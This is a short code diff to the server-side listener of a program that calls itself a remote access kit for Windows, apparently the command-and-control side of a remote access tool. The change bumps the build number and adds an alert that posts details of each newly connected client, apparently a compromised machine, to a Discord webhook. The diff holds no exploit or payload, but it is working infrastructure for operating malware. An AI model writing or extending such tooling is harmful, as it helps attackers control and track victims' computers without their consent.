@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 import socket
 import base64
@@ -18,7 +18,7 @@ import base64
 from ..utils.utils import ErrorHandling
 from ..networking.IP_Handler import IPAddress
 from ..threading.threads import MultiThreading
-from ..logging.logging import ConsoleWindow,ClientWindow,NetworkingConfigs
+from ..logging.logging import ConsoleWindow,ClientWindow,NetworkingConfigs,DiscordCFG
 from ..encryption.aes128 import Encryption,Decryption
 from ..utils.utils import Notifications
 
@@ -151,7 +151,9 @@ class ServerSocket:
         client_information_array.append(new_array)              #Append array as single item to master info array
         ClientWindow().record_active_connection(new_array)                    #Record information for active connection window on main ui
         Notifications().notify_new_connection(new_array[3],new_array[2],new_array[0]) #Notify user of new connection
-
+        if DiscordCFG().retrieve_notification_setting() != False:                   #If discord notifications are enabled
+            if DiscordCFG().retrieve_webhook() != '':                               #IF the webhook is not equal to empty string
+                Notifications().discord_notify(new_array[3],new_array[0],new_array[2])  #Notify new connection via discord
         return self.complete_handshake(master_key,new_array[3],client)         #return complete handshake function
 
     #Function completes handshake by launching heartbeat to see if client is alive
